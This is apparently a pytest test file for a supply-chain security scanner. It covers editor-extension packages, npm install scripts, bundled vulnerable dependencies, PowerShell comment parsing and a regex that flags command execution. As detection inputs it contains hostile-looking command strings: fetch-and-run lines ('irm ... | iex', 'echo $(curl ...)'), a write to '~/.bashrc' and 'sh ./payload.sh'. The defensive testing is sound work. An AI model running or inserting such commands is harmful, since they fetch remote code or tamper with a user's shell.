"""An editor extension is unpacked and started by the editor, never installed by npm."""

from __future__ import annotations

import json
import zipfile
from pathlib import Path
from typing import ClassVar

from cordon_scanner import Scanner
from cordon_scanner.detect.secrets import SourcePaths

MANIFEST = {
    "name": "theme",
    "version": "1.0.0",
    "engines": {"vscode": "^1.90.0"},
    "main": "./out/extension.js",
    "scripts": {"postinstall": "node ./scripts/setup.js"},
}


class ExtensionKit:
    @staticmethod
    def rules(root: Path) -> set[str]:
        return {f.rule_id for f in Scanner().scan(root).findings}

    @staticmethod
    def vsix(path: Path) -> Path:
        with zipfile.ZipFile(path, "w") as package:
            package.writestr("extension/package.json", json.dumps(MANIFEST))
            package.writestr("extension/scripts/setup.js", "console.log('ready');\n")
            package.writestr("extension/out/extension.js", "exports.activate = () => {};\n")
        return path


class TestWhereAnExtensionIs:
    def test_a_vsix_member_and_an_installed_extension_are_extensions(self) -> None:
        assert SourcePaths.is_editor_extension("theme.vsix!extension/package.json")
        assert SourcePaths.is_editor_extension(
            "/home/a/.vscode/extensions/pub.theme-1.0.0/package.json"
        )
        assert SourcePaths.is_editor_extension(".cursor/extensions/pub.theme-1.0.0/out/x.js")

    def test_a_project_is_not(self) -> None:
        assert not SourcePaths.is_editor_extension("package.json")
        assert not SourcePaths.is_editor_extension("src/extensions/registry.ts")


class TestLifecycleScripts:
    def test_an_extensions_npm_scripts_are_not_install_scripts(self, tmp_path: Path) -> None:
        """npm never runs in a packaged extension: the postinstall cannot run on this machine."""
        ExtensionKit.vsix(tmp_path / "theme.vsix")
        assert "SUSPECT.INSTALL.SCRIPT.001" not in ExtensionKit.rules(tmp_path)

    def test_the_same_manifest_in_a_project_still_is(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text(json.dumps(MANIFEST), encoding="utf-8")
        (tmp_path / "scripts").mkdir()
        (tmp_path / "scripts" / "setup.js").write_text("console.log('ready');\n", encoding="utf-8")
        assert "SUSPECT.INSTALL.SCRIPT.001" in ExtensionKit.rules(tmp_path)


class TestRecognisedInstallSteps:
    """What an install script may run without review: a native build, or a message."""

    def test_the_prebuilt_binary_loader_and_a_message_are_build_steps(self) -> None:
        from cordon_scanner.detect.manifest import ManifestScripts

        assert ManifestScripts._is_safe_lifecycle("node-gyp-build")
        assert ManifestScripts._is_safe_lifecycle("echo Installing native bindings")
        assert ManifestScripts._is_safe_lifecycle("node-gyp-build || echo optional build skipped")

    def test_an_echo_that_writes_or_runs_is_not(self) -> None:
        from cordon_scanner.detect.manifest import ManifestScripts

        assert not ManifestScripts._is_safe_lifecycle("echo x >> ~/.bashrc")
        assert not ManifestScripts._is_safe_lifecycle("echo $(curl -s https://example.invalid)")
        assert not ManifestScripts._is_safe_lifecycle("echo `id`")
        assert not ManifestScripts._is_safe_lifecycle("echo ok && node ./scripts/setup.js")


class TestBundledVulnerabilities:
    """A vulnerable library bundled in an extension is reported, not blocking: only its author can
    upgrade it. In a project, whose owner can, it still blocks."""

    LODASH: ClassVar[dict[str, str]] = {"name": "lodash", "version": "4.17.20"}

    @staticmethod
    def severities(root: Path, package: str) -> set[str]:
        return {
            f.severity.name.lower()
            for f in Scanner().scan(root).findings
            if f.rule_id == "VULNERABLE.DEPENDENCY.KNOWN.001"
            and package in (f.location.package or "")
        }

    def test_bundled_in_an_extension_it_is_medium(self, tmp_path: Path) -> None:
        with zipfile.ZipFile(tmp_path / "tool.vsix", "w") as package:
            declared = {**MANIFEST, "scripts": {}, "dependencies": {"lodash": "4.17.20"}}
            package.writestr("extension/package.json", json.dumps(declared))
            package.writestr("extension/node_modules/lodash/package.json", json.dumps(self.LODASH))
        assert self.severities(tmp_path, "lodash") == {"medium"}

    def test_in_a_project_it_still_blocks(self, tmp_path: Path) -> None:
        (tmp_path / "node_modules" / "lodash").mkdir(parents=True)
        (tmp_path / "node_modules" / "lodash" / "package.json").write_text(
            json.dumps(self.LODASH), encoding="utf-8"
        )
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "app", "version": "1.0.0", "dependencies": {"lodash": "4.17.20"}}),
            encoding="utf-8",
        )
        assert "high" in self.severities(tmp_path, "lodash")


class TestPowerShellBlockComments:
    """`<# ... #>` is PowerShell's block comment: a script's help and usage live there."""

    def test_the_block_is_a_comment_and_what_follows_is_code(self) -> None:
        from cordon_scanner.core.comments import SourceComments

        text = (
            "<#\n  Usage:\n    irm https://example.invalid/r.ps1 | iex\n#>\nWrite-Output 'done'\n"
        )
        spans = SourceComments.block_comment_spans(text, "powershell")
        assert spans == ((0, text.index("#>") + 2),)
        assert not SourceComments.inside_spans(spans, text.index("Write-Output"))

    def test_an_opener_inside_a_string_opens_nothing(self) -> None:
        from cordon_scanner.core.comments import SourceComments

        text = "$s = '<# not a comment'\nirm https://example.invalid/x | iex\n"
        assert SourceComments.block_comment_spans(text, "powershell") == ()

    def test_c_family_blocks_are_unchanged(self) -> None:
        from cordon_scanner.core.comments import SourceComments

        text = "/* a */ x();"
        assert SourceComments.block_comment_spans(text, "javascript") == ((0, 7),)
        assert SourceComments.block_comment_spans("<# a #>", "javascript") == ()


class TestWhatCountsAsRunningAFile:
    """`start` runs a file, or opens a link in the browser."""

    def test_opening_a_link_is_not_running_a_file(self) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        runs = CapabilityDetector._RUNS_A_FILE
        assert runs.search('`start "" "${extUrl}"`') is None
        assert runs.search("'start https://example.invalid/docs'") is None

    def test_starting_a_file_still_is(self) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        runs = CapabilityDetector._RUNS_A_FILE
        assert runs.search('`start "" "${tmp}"`') is not None
        assert runs.search("'start curl -o a && a'") is not None
        assert runs.search('"sh ./payload.sh"') is not None
